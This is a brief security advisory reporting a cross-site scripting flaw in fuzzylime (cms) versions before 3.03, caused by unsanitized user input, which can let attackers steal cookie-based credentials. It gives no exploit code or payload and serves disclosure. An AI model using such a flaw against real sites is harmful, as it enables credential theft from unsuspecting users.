fuzzylime (cms) is prone to a cross-site scripting vulnerability because it fails to properly sanitize user-supplied input.

Exploiting this vulnerability may allow an attacker to perform cross-site scripting attacks on unsuspecting users in the context of the affected site. As a result, the attacker may be able to steal cookie-based authentication credentials and to launch other attacks.

Versions prior to fuzzylime (cms) 3.03 are vulnerable.
